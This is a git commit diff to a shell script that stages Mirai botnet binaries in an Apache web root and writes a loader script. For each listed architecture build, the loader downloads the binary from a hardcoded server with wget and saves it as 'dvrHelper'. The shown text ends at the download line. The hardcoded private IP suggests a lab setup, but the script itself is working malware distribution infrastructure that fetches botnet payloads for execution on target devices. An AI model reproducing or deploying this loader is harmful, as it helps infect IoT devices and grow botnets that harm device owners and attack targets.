a7f21377c238b77930a2de97a3558ff056bc34df
Odinmylord <rgermenia@gmail.com>
2024-05-06 22:52:09 +0200

    add compilers files

--- apache2.sh
+++ apache2.sh
@@ -1,14 +1,12 @@
-read -p "Web server ip: " SERVER_IP
-
 mkdir /var/www/html/bins
-cp mirai* /var/www/html/bins
+cp /home/debug/mirai* /var/www/html/bins
 
 echo "#!/bin/sh
  
-WEBSERVER=\"$SERVER_IP:80\"
+WEBSERVER=\"192.168.10.10:80\"
  
  
-BINARIES=\"mirai.arm4n mirai.arm5n mirai.arm6n mirai.i586 mirai.i686 mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.spc mirai.x86 mirai.gnueabihf\"
+BINARIES=\"mirai.i586 mirai.x86 mirai.dbg\"
  
 for Binary in \$BINARIES; do
     wget http://\$WEBSERVER/bins/\$Binary -O dvrHelper
